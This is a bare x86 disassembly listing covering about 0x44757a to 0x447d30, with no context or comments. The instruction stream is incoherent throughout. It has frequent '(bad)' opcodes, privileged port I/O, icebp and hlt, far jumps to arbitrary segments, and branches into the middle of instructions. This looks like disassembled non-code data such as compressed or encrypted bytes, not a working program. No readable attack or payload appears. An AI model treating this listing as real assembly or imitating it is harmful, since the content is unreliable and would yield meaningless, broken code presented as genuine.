  44757a:	daa    
  44757b:	icebp  
  44757c:	dec    esi
  44757d:	bound  edx,QWORD PTR [ebp+edi*8+0x4f]
  447581:	ret    
  447582:	mov    esp,0xc1b44cd4
  447587:	in     eax,0x66
  447589:	xchg   esi,eax
  44758a:	int    0xcb
  44758c:	outs   dx,DWORD PTR ds:[esi]
  44758d:	adc    ebx,0xffffffd5
  447590:	jb     0x447547
  447592:	jo     0x447596
  447594:	inc    esp
  447595:	(bad)  
  447596:	shl    cl,0x6b
  447599:	add    BYTE PTR [edx+0x7e65d9ae],cl
  44759f:	mov    ch,0xe4
  4475a1:	imul   eax,DWORD PTR [edi+0x7568ebd6],0x7e
  4475a8:	sar    edi,1
  4475aa:	fstp   st(1)
  4475ac:	rol    DWORD PTR [ebx],0x32
  4475af:	clc    
  4475b0:	retf   
  4475b1:	fisttp DWORD PTR [esp+esi*8-0xfac402d]
  4475b8:	int    0xde
  4475ba:	daa    
  4475bb:	add    al,0xcd
  4475bd:	in     eax,0x16
  4475bf:	or     ecx,DWORD PTR [edi-0x6b27cefd]
  4475c5:	cmc    
  4475c6:	inc    ecx
  4475c7:	and    al,0xb6
  4475c9:	ficom  WORD PTR [eax]
  4475cb:	cli    
  4475cc:	mov    bl,dh
  4475ce:	ss sbb al,ch
  4475d1:	add    ebp,DWORD PTR [ebp-0x28]
  4475d4:	mov    edx,0x751a13ef
  4475d9:	repz daa 
  4475db:	adc    BYTE PTR [ecx-0x6826b9fd],ch
  4475e1:	loop   0x4475dc
  4475e3:	lock test al,0xdf
  4475e6:	or     DWORD PTR [ebx],ebx
  4475e8:	mov    esp,esp
  4475ea:	enter  0x4c0a,0xe3
  4475ee:	shl    cl,1
  4475f0:	cs add al,0xc2
  4475f3:	fnstenv [edi]
  4475f5:	jecxz  0x4475b0
  4475f7:	icebp  
  4475f8:	and    ch,dh
  4475fa:	jns    0x4475ec
  4475fc:	cmp    edi,ebx
  4475fe:	add    al,al
  447600:	add    eax,0x26aaf647
  447605:	call   0x181dea0d
  44760a:	jecxz  0x447595
  44760c:	icebp  
  44760d:	sub    al,ah
  44760f:	mov    ecx,0xaef02014
  447614:	out    dx,eax
  447615:	sbb    bl,bl
  447617:	jl     0x447608
  447619:	cs add al,0x7e
  44761c:	fst    DWORD PTR [edi]
  44761e:	jecxz  0x4475a9
  447620:	icebp  
  447621:	sbb    bh,ch
  447623:	test   BYTE PTR ds:0xee0f0c01,al
  447629:	pop    edi
  44762a:	or     bh,BYTE PTR [ebp+0x61e94e0a]
  447630:	(bad)  
  447631:	(bad)  
  447632:	mov    ecx,0xaa5307bd
  447637:	test   eax,0x61e94007
  44763c:	mov    ebx,0x7c599ff
  447641:	inc    edx
  447642:	int3   
  447643:	mov    cl,0x10
  447645:	dec    esi
  447646:	jmp    0x9a445aac
  44764b:	lea    eax,[edi]
  44764d:	inc    edx
  44764e:	xchg   ecx,eax
  44764f:	(bad)  
  447650:	push   cs
  447651:	add    ebx,edx
  447653:	pusha  
  447654:	sub    ch,BYTE PTR [ebp-0x65]
  447657:	sahf   
  447658:	hlt    
  447659:	jo     0x4475fa
  44765b:	mov    eax,0x60d2010e
  447660:	sub    ch,BYTE PTR [ebp+0x7b]
  447663:	add    BYTE PTR [esi-0x6d588f0c],ah
  447669:	jge    0x447661
  44766b:	shl    DWORD PTR [eax+0x28],1
  44766e:	ins    DWORD PTR es:[edi],dx
  44766f:	pop    ebx
  447670:	and    ebp,esi
  447672:	jb     0x44769c
  447674:	push   bx
  447676:	add    DWORD PTR [ecx],edi
  447678:	aas    
  447679:	icebp  
  44767a:	push   0x65f6433b
  44767f:	aas    
  447680:	inc    ebx
  447681:	mov    esi,0xf7433578
  447686:	jno    0x4476c8
  447688:	or     eax,0x61e94df7
  44768d:	add    al,BYTE PTR [eax]
  44768f:	push   ds
  447690:	add    al,0xf7
  447692:	jno    0x4476ad
  447694:	adc    dl,dh
  447696:	sbb    ax,0xc24
  44769a:	add    DWORD PTR [ecx],edx
  44769c:	addr16 in al,dx
  44769e:	outs   dx,BYTE PTR ds:[esi]
  44769f:	add    BYTE PTR [ebp-0x78],cl
  4476a2:	data16 jb 0x4476f7
  4476a5:	mov    ds:0xd53a666a,eax
  4476aa:	add    BYTE PTR [eax],0x7b
  4476ad:	jbe    0x447719
  4476af:	push   0x636a760e
  4476b4:	mov    bl,0xa7
  4476b6:	gs cbw 
  4476b9:	mov    esi,esi
  4476bb:	call   DWORD PTR [ebx-0x89eaf28]
  4476c1:	mov    al,ds:0xaad67349
  4476c6:	inc    edx
  4476c7:	push   edi
  4476c8:	add    BYTE PTR [ebx-0xb7ae28],bh
  4476ce:	mov    eax,DWORD PTR [ecx+0x50]
  4476d1:	shl    dh,cl
  4476d3:	push   esp
  4476d4:	ins    BYTE PTR es:[edi],dx
  4476d5:	(bad)  
  4476d7:	mov    ebx,0x3740c800
  4476dc:	xlat   BYTE PTR gs:[ebx]
  4476de:	ds pop edi
  4476e0:	ins    BYTE PTR es:[edi],dx
  4476e1:	out    0x79,eax
  4476e3:	jo     0x447735
  4476e5:	fisubr DWORD PTR [esi+ebx*2+0x57]
  4476e9:	jnp    0x4476c3
  4476eb:	idiv   bh
  4476ed:	or     BYTE PTR [ebx-0x5c5592a3],ah
  4476f3:	pop    edx
  4476f4:	dec    esp
  4476f5:	mov    dl,0xa3
  4476f7:	push   ebp
  4476f8:	push   esp
  4476f9:	pushf  
  4476fa:	xchg   esi,eax
  4476fb:	jo     0x447764
  4476fd:	xchg   ebp,eax
  4476fe:	mov    esi,?
  447700:	(bad)  
  447701:	cmp    ebp,edx
  447703:	push   ecx
  447704:	push   0x4562a1a6
  447709:	jae    0x447785
  44770b:	arpl   WORD PTR [ebp+0x57],si
  44770e:	jp     0x447757
  447710:	add    BYTE PTR [eax+0x3d],bl
  447713:	xor    eax,0x32c83f4c
  447718:	cs (bad) 
  44771a:	into   
  44771b:	fsub   DWORD PTR [ebx+0x62]
  44771e:	add    BYTE PTR [edx],0x3c
  447721:	jg     0x447709
  447723:	fild   QWORD PTR [ebx-0x79]
  447726:	(bad)  
  447728:	bound  ebp,QWORD PTR [edi-0x80]
  44772b:	aad    0x6b
  44772d:	add    BYTE PTR [ebx-0x51],bl
  447730:	int    0x65
  447732:	dec    esi
  447733:	(bad)  
  447734:	jmp    0x3f3c:0x26b626b
  44773b:	(bad)  
  44773c:	lock js 0x447771
  44773f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  447740:	mov    ecx,0xdd3f315c
  447745:	pop    esi
  447746:	inc    edi
  447747:	jb     0x44774b
  447749:	adc    esp,DWORD PTR [edx+0x2d]
  44774c:	int3   
  44774d:	bound  edx,QWORD PTR [eax]
  44774f:	dec    ecx
  447750:	repnz imul esp,DWORD PTR [edi],0x4d
  447754:	repz jb 0x44775a
  447757:	push   ebx
  447758:	loope  0x447759
  44775a:	test   DWORD PTR [edx+eax*1-0x2e99f8c1],eax
  447761:	jb     0x447762
  447763:	jmp    FWORD PTR [ebx-0x3eab00a0]
  447769:	ja     0x447778
  44776b:	jb     0x44776f
  44776d:	push   ebx
  44776e:	(bad)  
  44776f:	dec    edi
  447770:	icebp  
  447771:	jno    0x447704
  447773:	fimul  WORD PTR [esi]
  447775:	pop    esp
  447776:	mov    esi,0x6278fd0c
  44777b:	scas   eax,DWORD PTR es:[edi]
  44777c:	retf   
  44777d:	dec    ebx
  44777e:	ret    
  44777f:	pop    ds
  447780:	fadd   DWORD PTR [edi+edi*4+0x25]
  447784:	mov    bh,0x71
  447786:	(bad)  
  447787:	adc    eax,0xaf6203fd
  44778c:	mov    eax,0xb6b4ab52
  447791:	jno    0x447793
  447793:	test   ecx,ebx
  447795:	or     al,0xd1
  447797:	jns    0x4477a0
  447799:	adc    esi,edx
  44779b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44779c:	fst    DWORD PTR [ebx+eax*1-0x6f]
  4477a0:	add    eax,0xf27fdb1a
  4477a5:	and    eax,0x1eec84f2
  4477aa:	iret   
  4477ab:	call   0x2ad9:0x7b03ba15
  4477b2:	aad    0x20
  4477b4:	pop    es
  4477b5:	(bad)
  4477b8:	hlt    
  4477b9:	mov    al,0xd5
  4477bb:	push   eax
  4477bc:	add    eax,0xf440d5c9
  4477c1:	out    0x3,eax
  4477c3:	das    
  4477c4:	fldcw  WORD PTR [edx-0x2f14e12c]
  4477ca:	aad    0x3a
  4477cc:	add    eax,0xf001e2c1
  4477d1:	mov    cl,0xde
  4477d3:	xchg   ebp,eax
  4477d4:	jp     0x44778e
  4477d6:	add    esp,DWORD PTR [ecx]
  4477d8:	jmp    0xe281:0x4fad5b0
  4477df:	add    eax,esi
  4477e1:	xchg   ecx,eax
  4477e2:	ficom  WORD PTR [eax]
  4477e4:	hlt    
  4477e5:	mov    ch,dh
  4477e7:	repz out dx,eax
  4477e9:	imul   ebp,edx,0x65
  4477ec:	jp     0x44778d
  4477ee:	add    esp,DWORD PTR [ecx-0x352a5f16]
  4477f4:	add    eax,0xc100e351
  4477f9:	lock popa 
  4477fb:	fild   WORD PTR [esi-0x31fc17ff]
  447801:	fldcw  WORD PTR [edx]
  447803:	aad    0x90
  447805:	hlt    
  447806:	xor    edx,esp
  447808:	mov    bl,0xea
  44780a:	aas    
  44780b:	jmp    0x4477b0
  44780d:	in     eax,dx
  44780e:	add    BYTE PTR [eax+0x34],cl
  447811:	out    dx,eax
  447812:	pop    ebx
  447813:	xor    eax,0x2a01615e
  447818:	adc    BYTE PTR ds:0x27251560,bl
  44781e:	ins    DWORD PTR es:[edi],dx
  44781f:	sbb    ebx,DWORD PTR ds:0xc1e63f9
  447825:	adc    bh,BYTE PTR [esi]
  447827:	adc    eax,0xd5ff817
  44782c:	pop    esi
  44782d:	repnz fs or al,0x93
  447831:	(bad)  
  447832:	es add eax,0x1900f5ba
  447838:	pushw  ss
  44783a:	jae    0x447800
  44783c:	shr    ch,0x5b
  44783f:	stos   BYTE PTR es:[edi],al
  447840:	xchg   esi,eax
  447841:	hlt    
  447842:	jo     0x44780c
  447844:	(bad)
  447847:	aad    0x8c
  447849:	pop    ss
  44784a:	push   0x70f88cb5
  44784f:	jmp    0xaa4540b5
  447854:	xchg   ebx,eax
  447855:	sbb    al,0x60
  447857:	popf   
  447858:	lods   al,BYTE PTR ds:[esi]
  447859:	push   ss
  44785a:	data16 mov WORD PTR [eax],es
  44785d:	xchg   ecx,eax
  44785e:	clc    
  44785f:	ins    BYTE PTR es:[edi],dx
  447860:	add    BYTE PTR [ebx-0x5d5aa40b],0x79
  447867:	div    BYTE PTR [eax]
  447869:	arpl   WORD PTR [esi],sp
  44786b:	pop    esp
  44786c:	lea    eax,[esi+esi*8+0x343a66c]
  447873:	pop    esp
  447874:	mov    al,BYTE PTR [ebp+0x79]
  447877:	imul   ah
  447879:	data16 mov ch,0x5b
  44787c:	dec    ebp
  44787d:	cmp    eax,DWORD PTR ds:0x344265c
  447883:	pop    esp
  447884:	dec    edx
  447885:	sbb    bh,BYTE PTR [ecx-0xa]
  447888:	add    BYTE PTR [eax],dl
  44788a:	fbstp  TBYTE PTR ds:0x55a16f65
  447890:	jbe    0x447834
  447892:	adc    BYTE PTR [ebp+0x43],0xaa
  447896:	lea    esi,[ebx+0x0]
  447899:	stc    
  44789a:	fnsave [eiz*2+0x656a8257]
  4478a1:	dec    edi
  4478a2:	mov    al,ds:0xdd18fff6
  4478a7:	inc    ecx
  4478a8:	jb     0x447908
  4478aa:	jle    0x447916
  4478ac:	gs aas 
  4478ae:	mov    al,ds:0xdcb80047
  4478b3:	inc    edx
  4478b4:	imul   ecx,edi,0xbb74629e
  4478ba:	fcom   QWORD PTR [ecx+0x73820902]
  4478c0:	je     0x4478c2
  4478c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4478c3:	mov    ss,WORD PTR [ebp+0x44]
  4478c6:	or     ch,bl
  4478c8:	call   0xff65:0x647dc802
  4478cf:	lahf   
  4478d0:	idiv   bh
  4478d2:	pop    ecx
  4478d3:	fist   WORD PTR [ecx+0x65]
  4478d6:	iret   
  4478d7:	cs push ebp
  4478d9:	arpl   di,bp
  4478db:	cs push edi
  4478dd:	outs   dx,BYTE PTR ds:[esi]
  4478de:	jnp    0x4478bc
  4478e0:	test   BYTE PTR [ecx],al
  4478e2:	int3   
  4478e3:	sub    BYTE PTR [ecx+0x46],0xf7
  4478e7:	nop
  4478e8:	jae    0x447952
  4478ea:	jnp    0x4478c8
  4478ec:	stc    
  4478ed:	add    cl,al
  4478ef:	sub    DWORD PTR [edx+0x56],0x706780e2
  4478f6:	aam    0x8e
  4478f8:	push   0x4f
  4478fa:	test   eax,0x3b783584
  4478ff:	fsub   st(2),st
  447901:	add    DWORD PTR [edx-0x39],esp
  447904:	out    0x6b,eax
  447906:	sahf   
  447907:	mov    ecx,0xb3b668be
  44790c:	cld    
  44790d:	sub    eax,0x5ccec362
  447912:	xor    DWORD PTR [esi-0x3b54c419],0xffffffad
  447919:	pop    esp
  44791a:	adc    esi,0x827466e3
  447920:	add    bh,BYTE PTR [edi]
  447922:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  447923:	mov    ecx,0x4400320d
  447928:	fdivrp st(0),st
  44792a:	arpl   WORD PTR [edx+0x32],sp
  44792d:	add    cl,BYTE PTR [edi-0x6f]
  447930:	ror    ecx,0x5c
  447933:	push   esi
  447934:	mov    edi,0x76505cda
  447939:	(bad)  [edi+0x52]
  44793c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44793d:	ficom  WORD PTR [ecx+0x3f]
  447940:	xchg   ebx,eax
  447941:	fldenv [ebx+0x36]
  447944:	add    BYTE PTR [edx],0x45
  447947:	bound  ebp,QWORD PTR [edi]
  447949:	scas   eax,DWORD PTR es:[edi]
  44794a:	inc    eax
  44794b:	adc    DWORD PTR [ebp+0x2a625bf0],esp
  447951:	add    cl,BYTE PTR [edi+0x31]
  447954:	inc    ecx
  447955:	lods   al,BYTE PTR ds:[esi]
  447956:	pop    esp
  447957:	add    DWORD PTR [eax],esi
  447959:	add    cl,BYTE PTR [ebp+0x5ccc6862]
  44795f:	jmp    DWORD PTR [eax-0x22]
  447962:	pop    ebx
  447963:	lock pop eax
  447965:	lock pop ebp
  447967:	add    eax,0x628e0282
  44796c:	addr16 jmp 0xdea27cdd
  447972:	jno    0x44793f
  447974:	pop    esi
  447975:	call   0x28edbe0
  44797a:	dec    edi
  44797b:	mov    cl,0xd9
  44797d:	sub    BYTE PTR [ebp-0xdaf1447],dh
  447983:	pushf  
  447984:	or     eax,0xfd99c33f
  447989:	pop    ecx
  44798a:	out    0x0,eax
  44798c:	mov    al,0xea
  44798e:	push   ss
  44798f:	add    al,0x50
  447991:	(bad)  [esi]
  447993:	mov    ch,0xa2
  447995:	sbb    BYTE PTR [eax+ebp*8-0x6d],al
  447999:	cld    
  44799a:	cmp    dl,ch
  44799c:	cdq    
  44799d:	push   es
  44799e:	cmp    ebx,eax
  4479a0:	xchg   ebx,eax
  4479a1:	add    BYTE PTR [esi],al
  4479a3:	jmp    0x408534a
  4479a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4479a9:	or     ch,BYTE PTR [ecx]
  4479ab:	lds    esi,FWORD PTR [ebx-0x4]
  4479ae:	or     al,bl
  4479b0:	xchg   BYTE PTR [esi+ebp*8],bl
  4479b3:	out    0x47,al
  4479b5:	in     eax,dx
  4479b6:	out    0x3,eax
  4479b8:	jl     0x447993
  4479ba:	push   cs
  4479bb:	mov    ch,0x22
  4479bd:	sbb    al,0xd6
  4479bf:	out    0x3f,al
  4479c1:	in     eax,dx
  4479c2:	mov    edx,0xcafc41e6
  4479c7:	xlat   BYTE PTR ds:[ebx]
  4479c8:	mov    ch,0x76
  4479ca:	add    eax,DWORD PTR [ebx*1+0x3fc6a90a]
  4479d1:	in     al,dx
  4479d2:	(bad)  
  4479d3:	sar    DWORD PTR [esi],1
  4479d5:	in     eax,dx
  4479d6:	mov    dh,0xf0
  4479d8:	adc    eax,DWORD PTR [edx]
  4479da:	popf   
  4479db:	fldcw  WORD PTR [esi]
  4479dd:	pop    es
  4479de:	xchg   esp,eax
  4479df:	aam    0x85
  4479e1:	jbe    0x4479de
  4479e3:	add    ebp,DWORD PTR ds:0x19c2a90a
  4479e9:	std    
  4479ea:	cdq    
  4479eb:	out    0xf0,al
  4479ed:	jmp    0x10456a85
  4479f2:	in     eax,dx
  4479f3:	jns    0x4479df
  4479f5:	(bad)  
  4479f6:	inc    BYTE PTR [eax]
  4479f8:	sahf   
  4479f9:	popa   
  4479fa:	mov    bl,0x0
  4479fc:	xchg   esi,eax
  4479fd:	push   ss
  4479fe:	sbb    DWORD PTR [eax+0x56],ecx
  447a01:	aas    
  447a02:	add    ah,BYTE PTR [ebp-0x17]
  447a05:	popa   
  447a06:	into   
  447a07:	add    BYTE PTR [esi],bh
  447a09:	out    dx,eax
  447a0a:	sbb    BYTE PTR [edx+0x3d],al
  447a0d:	xor    ebp,ebx
  447a0f:	pop    ebx
  447a10:	sub    al,0x8
  447a12:	adc    eax,0x26663567
  447a17:	push   edx
  447a18:	sti    
  447a19:	and    ch,BYTE PTR [ebx-0x5fa00ce]
  447a1f:	fs jmp 0x39443386
  447a25:	sub    BYTE PTR [esi],cl
  447a27:	dec    eax
  447a28:	add    al,0xe
  447a2a:	push   DWORD PTR [edx+0x15]
  447a2d:	daa    
  447a2e:	adc    eax,0x1aefd73
  447a33:	data16 sti 
  447a35:	les    esi,FWORD PTR [ebp-0xa]
  447a38:	lea    esp,[ecx+0x1a]
  447a3b:	jae    0x447a2d
  447a3d:	mov    cl,0x1
  447a3f:	dec    esp
  447a40:	xlat   BYTE PTR ds:[ebx]
  447a41:	mov    cl,0xe7
  447a43:	gs aad 0xc4
  447a46:	cli    
  447a47:	ins    BYTE PTR es:[edi],dx
  447a48:	lods   eax,DWORD PTR ds:[esi]
  447a49:	rol    BYTE PTR [ecx],0x60
  447a4c:	jmp    0xaa4532b2
  447a51:	mov    esp,0xa56ce7
  447a56:	test   cl,bh
  447a58:	pop    ebx
  447a59:	mov    ebp,0xbb5c1a7c
  447a5e:	mov    ch,0x0
  447a60:	pop    edi
  447a61:	nop
  447a62:	jle    0x447a5c
  447a64:	ins    BYTE PTR es:[edi],dx
  447a65:	test   BYTE PTR [ebx-0x517b9a19],ch
  447a6b:	add    DWORD PTR [esi-0x65],esp
  447a6e:	test   BYTE PTR [ebp-0xa],dh
  447a71:	add    cl,al
  447a73:	fld    DWORD PTR [ecx+0x65]
  447a76:	(bad)  [edi+edi*1+0x536ae670]
  447a7d:	jns    0x447a47
  447a7f:	mov    WORD PTR [ebp+0x6d],ss
  447a82:	mov    BYTE PTR [ecx+0x2ca6725f],dl
  447a88:	idiv   bh
  447a8a:	cmp    ecx,ebx
  447a8c:	inc    ecx
  447a8d:	mov    DWORD PTR gs:[ecx-0x777393bd],edx
  447a94:	push   ebp
  447a95:	push   ebx
  447a96:	push   edi
  447a97:	test   BYTE PTR [eax+0x65],dh
  447a9a:	or     ebx,ecx
  447a9c:	sbb    al,0x0
  447a9e:	cmp    BYTE PTR [edx-0x7cc98b90],al
  447aa4:	gs ins DWORD PTR es:[edi],dx
  447aa6:	dec    eax
  447aa7:	xor    BYTE PTR [eax+0x74],0x62
  447aab:	jnp    0x447b16
  447aad:	arpl   WORD PTR [edx-0x6f],bx
  447ab0:	push   ebp
  447ab1:	jae    0x447ae5
  447ab3:	adc    DWORD PTR [ebx+0x74],0x6c
  447ab7:	xchg   DWORD PTR [ebp+0x0],edx
  447aba:	add    BYTE PTR [esi-0x369abe28],ah
  447ac0:	mov    WORD PTR [edx],?
  447ac2:	jne    0x447a6f
  447ac4:	test   BYTE PTR [ecx+0x63],ch
  447ac7:	stos   BYTE PTR es:[edi],al
  447ac8:	mov    WORD PTR [ebp+0x43],ss
  447acb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  447acc:	mov    ch,BYTE PTR [edx+0x69]
  447acf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  447ad0:	test   DWORD PTR [ebx+0x61],esp
  447ad3:	out    0x81,eax
  447ad5:	inc    ebx
  447ad6:	outs   dx,DWORD PTR ds:[esi]
  447ad7:	lods   eax,DWORD PTR ds:[esi]
  447ad8:	mov    WORD PTR [ebp+0x78],ss
  447adb:	xlat   BYTE PTR ds:[ebx]
  447adc:	fmul   DWORD PTR ds:0x4e9eeb01
  447ae2:	inc    ebp
  447ae3:	ret    
  447ae4:	mov    BYTE PTR [edi+0x72],bl
  447ae7:	xlat   BYTE PTR ds:[ebx]
  447ae8:	xchg   edi,eax
  447ae9:	push   ebp
  447aea:	jb     0x447b4e
  447aec:	push   esi
  447aed:	mov    bl,0x6b
  447aef:	std    
  447af0:	dec    edi
  447af1:	jmp    0x2c66532
  447af6:	inc    ebx
  447af7:	mov    al,0x39
  447af9:	mov    dl,0x4b
  447afb:	xchg   ecx,eax
  447afc:	xor    BYTE PTR [esp+ebx*2],ah
  447aff:	mov    esi,0x626f01f6
  447b04:	stos   BYTE PTR es:[edi],al
  447b05:	fsubr  DWORD PTR [ebx-0x4e]
  447b08:	mov    cl,0xd7
  447b0a:	pop    esp
  447b0b:	mov    al,0x9
  447b0d:	les    esp,FWORD PTR [ebp-0x3c]
  447b10:	mov    bl,0xbb
  447b12:	jmp    DWORD PTR ds:0x8c490215
  447b18:	scas   al,BYTE PTR es:[edi]
  447b19:	out    0x71,eax
  447b1b:	test   BYTE PTR ds:0x7d0042d9,ah
  447b21:	mov    ah,0xe6
  447b23:	pop    esp
  447b24:	adc    esi,0x3cfdffbb
  447b2a:	add    cl,BYTE PTR [ecx-0x7c]
  447b2d:	(bad)  
  447b2e:	out    0x71,eax
  447b30:	jl     0x447b0f
  447b32:	fcom   DWORD PTR [ecx+0x7f]
  447b35:	loope  0x447b1f
  447b37:	cmp    eax,0xffe7e64b
  447b3c:	aad    0x4f
  447b3e:	add    cl,BYTE PTR [ecx+0x3c]
  447b41:	outs   dx,BYTE PTR ds:[esi]
  447b42:	jmp    0xcee9afb8
  447b47:	push   edx
  447b48:	inc    edi
  447b49:	mov    es,edi
  447b4b:	outs   dx,DWORD PTR ds:[esi]
  447b4c:	cs cdq 
  447b4e:	out    0x65,eax
  447b50:	and    eax,DWORD PTR [edx+0x2a627202]
  447b56:	into   
  447b57:	imul   edx,DWORD PTR [edx],0x43
  447b5a:	rcr    BYTE PTR [esp+eax*1+0x50],cl
  447b5e:	jmp    0xd3e192d3
  447b63:	imul   esp,DWORD PTR [ebx],0xffffffd9
  447b66:	out    0x3,eax
  447b68:	or     cl,bl
  447b6a:	scas   eax,DWORD PTR es:[edi]
  447b6b:	xlat   BYTE PTR ds:[ebx]
  447b6c:	or     ecx,ebp
  447b6e:	test   al,0xe7
  447b70:	or     DWORD PTR [edi],eax
  447b72:	jge    0x447b48
  447b74:	idiv   ch
  447b76:	jp     0x447b4f
  447b78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  447b79:	cld    
  447b7a:	mov    bh,ah
  447b7c:	mov    dh,0xe7
  447b7e:	jp     0x447b44
  447b80:	dec    ebp
  447b81:	jae    0x447bf4
  447b83:	add    eax,DWORD PTR [eax]
  447b85:	call   0x45fc:0x90d453ed
  447b8c:	call   0xd79d7824
  447b91:	mov    fs,esi
  447b93:	dec    ebx
  447b94:	ret    
  447b95:	and    eax,0xab047d73
  447b9a:	add    ebp,DWORD PTR [edi+eiz*8]
  447b9d:	xchg   ebx,eax
  447b9e:	add    eax,DWORD PTR [ebp-0x28]
  447ba1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  447ba2:	jmp    0xd9e769e3
  447ba7:	outs   dx,BYTE PTR ds:[esi]
  447ba8:	add    al,0xab
  447baa:	add    ecx,DWORD PTR [edi+eiz*8]
  447bad:	jae    0x447bb2
  447baf:	add    eax,0xf705a0d8
  447bb4:	rol    BYTE PTR [esi+0x39ee0921],1
  447bba:	add    eax,0xd9a103fd
  447bbf:	and    dh,ch
  447bc1:	cmp    esp,edi
  447bc3:	stc    
  447bc4:	in     eax,dx
  447bc5:	es in  eax,dx
  447bc7:	mov    eax,0xe0e71ed6
  447bcc:	int3   
  447bcd:	inc    ebp
  447bce:	in     eax,dx
  447bcf:	shr    ah,0x47
  447bd2:	sbb    al,ch
  447bd4:	add    edx,ebp
  447bd6:	fnstenv [eax-0x4603f613]
  447bdc:	in     eax,dx
  447bdd:	ss in  eax,dx
  447bdf:	add    BYTE PTR [edx-0x3d9e064d],ch
  447be5:	int3   
  447be6:	call   0x6145244f
  447beb:	and    cl,BYTE PTR [eax-0x51]
  447bee:	test   al,0x1c
  447bf0:	cmp    al,0xbd
  447bf2:	aas    
  447bf3:	adc    eax,0x1a617d65
  447bf8:	inc    ebp
  447bf9:	lods   al,BYTE PTR ds:[esi]
  447bfa:	and    BYTE PTR ds:0xbb73ba4d,ah
  447c00:	pop    esp
  447c01:	test   DWORD PTR ds:0x61f4f672,edi
  447c07:	sbb    ebx,DWORD PTR [ebp+ebx*2-0xb]
  447c0b:	out    0x5b,al
  447c0d:	pop    ebx
  447c0e:	pop    ds
  447c0f:	adc    eax,0x143c206d
  447c14:	jmpw   0x8c79
  447c18:	add    DWORD PTR [edi],esi
  447c1a:	add    eax,0x9393ffe
  447c1f:	sbb    BYTE PTR [edi+ecx*2+0x4],ch
  447c23:	adc    eax,0x15302773
  447c28:	pop    esp
  447c29:	jmp    0x2f45e28f
  447c2e:	std    
  447c2f:	std    
  447c30:	dec    ebx
  447c31:	sbb    al,BYTE PTR ds:0xcff3be8
  447c37:	std    
  447c38:	add    BYTE PTR [edi],dh
  447c3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  447c3b:	sbb    eax,0xa6a91940
  447c40:	xor    al,bh
  447c42:	vpcmpgtb ymm5,ymm1,ymm1
  447c46:	popa   
  447c47:	scas   eax,DWORD PTR es:[edi]
  447c48:	add    BYTE PTR [esi-0x3ac0023c],ch
  447c4e:	add    al,al
  447c50:	add    DWORD PTR [ebp-0x34],ebp
  447c53:	xchg   ebx,eax
  447c54:	out    0x3f,al
  447c56:	lds    edi,FWORD PTR [ebp-0x27ffa419]
  447c5c:	mov    BYTE PTR [ebp+0x73],dl
  447c5f:	mov    edx,ebp
  447c61:	inc    edi
  447c62:	push   eax
  447c63:	ret    
  447c64:	mov    eax,ds:0x9eeb4146
  447c69:	sbb    al,0x44
  447c6b:	mov    bh,0xa1
  447c6d:	idiv   bh
  447c6f:	lods   eax,DWORD PTR ds:[esi]
  447c70:	(bad)  
  447c71:	dec    ebp
  447c72:	gs leave 
  447c74:	xchg   DWORD PTR [edi+ebp*2+0x7b],ebx
  447c78:	aad    0xea
  447c7a:	add    al,0xf6
  447c7c:	ja     0x447cdb
  447c7e:	arpl   bx,bx
  447c80:	xchg   ebx,eax
  447c81:	idiv   bh
  447c83:	(bad)  
  447c84:	fcomp  DWORD PTR [ebx+0x65]
  447c87:	(bad)  
  447c88:	jns    0x447ce7
  447c8a:	jo     0x447cd7
  447c8c:	fstp   st(6)
  447c8e:	add    al,0xa6
  447c90:	jp     0x447cef
  447c92:	jae    0x447c32
  447c94:	mov    esi,esi
  447c96:	jmp    edi
  447c98:	fstp   DWORD PTR [ebx+0x65]
  447c9b:	mov    dh,0x82
  447c9d:	pop    edi
  447c9e:	jbe    0x447c3e
  447ca0:	aad    0x4
  447ca2:	add    eax,0x63708948
  447ca7:	inc    esi
  447ca8:	test   esi,esi
  447caa:	inc    edi
  447cac:	xlat   BYTE PTR ds:[ebx]
  447cad:	dec    ebp
  447cae:	jo     0x447cfe
  447cb0:	xchg   DWORD PTR [ebp+0x63],edx
  447cb3:	add    BYTE PTR [edx-0x7f],bl
  447cb6:	bound  eax,QWORD PTR [eax]
  447cb8:	jecxz  0x447c93
  447cba:	pop    ebx
  447cbb:	gs jbe 0x447d36
  447cbe:	pop    esi
  447cbf:	jb     0x447c8c
  447cc1:	fdivr  QWORD PTR [esi+0x738b7403]
  447cc7:	outs   dx,BYTE PTR ds:[esi]
  447cc8:	int3   
  447cc9:	mov    WORD PTR [eax+0x69],?
  447ccc:	xchg   ebp,eax
  447ccd:	mov    al,ds:0xd8730054
  447cd2:	dec    ebp
  447cd3:	jbe    0x447d37
  447cd5:	xchg   ebx,eax
  447cd6:	call   0xe8ddad4a
  447cdb:	imul   eax,DWORD PTR [edx+eax*4],0x2
  447cdf:	outs   dx,DWORD PTR ds:[esi]
  447ce0:	pop    esi
  447ce1:	mov    eax,ds:0xdb6272dc
  447ce6:	push   DWORD PTR [edx+0xe]
  447ce9:	xor    al,0xc6
  447ceb:	test   WORD PTR [ebp+0x2],0x6196
  447cf1:	das    
  447cf2:	shl    DWORD PTR [ebx-0xa],1
  447cf5:	push   esi
  447cf6:	sar    edi,cl
  447cf8:	gs in  eax,dx
  447cfa:	into   
  447cfb:	ins    DWORD PTR es:[edi],dx
  447cfc:	shl    esp,0xc5
  447cff:	and    eax,0xffde5ebe
  447d04:	dec    ebp
  447d05:	jp     0x447d09
  447d07:	aas    
  447d08:	mov    edi,0xce68bfe6
  447d0d:	sbb    eax,0x13b05cb3
  447d12:	in     al,0x66
  447d14:	mov    esp,0x5deab9
  447d19:	mov    ch,0xa7
  447d1b:	cld    
  447d1c:	punpckldq mm2,mm0
  447d1f:	fbstp  TBYTE PTR [ecx-0x4d]
  447d22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  447d23:	fbstp  TBYTE PTR [ecx-0x75]
  447d26:	rcr    bl,1
  447d28:	arpl   WORD PTR [edi-0x2004deb],cx
  447d2e:	jle    0x447d32
  447d30:	aas    
